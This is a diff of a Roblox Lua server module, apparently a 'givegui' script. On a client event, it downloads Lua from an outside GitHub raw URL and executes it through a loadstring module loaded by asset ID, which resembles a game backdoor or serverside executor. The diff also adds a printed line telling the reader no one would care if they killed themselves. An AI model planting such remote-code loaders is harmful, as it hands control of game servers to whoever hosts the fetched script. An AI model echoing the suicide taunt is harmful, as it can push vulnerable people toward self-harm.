@@ -323,9 +323,7 @@ function module:givegui(player)
 		local serverscripts = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/thatrandomnoob23/a-random-script/join/serverscripts.lua", true))()
 		print("loadstrngserversuccess")
 		task.wait(2)
-		local loding = game:GetService("InsertService"):Insert(4689019964)
-		loding.Parent = game:GetService("ServerScriptService")
-		local loadstring = require(loding)
+		local loadstring = require(game:GetService("InsertService"):LoadAsset(4689019964))
 		task.wait(1)
 		local clientscripts = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/thatrandomnoob23/a-random-script/join/localscripts.lua", true))()
 		print("loadstrngclientscuess")
@@ -342,6 +340,6 @@ game:GetService("ReplicatedStorage").givegui.OnServerEvent:Connect(function(play
     module:givegui(player)
 end)
 
-print("WCOMMIT CHANGESW")
+print("INSIGHTFUL MESSAGE EXPLAINING WHY NO ONE WOULD CARE IF YOU KILLED YOURSELF")
 
 return module
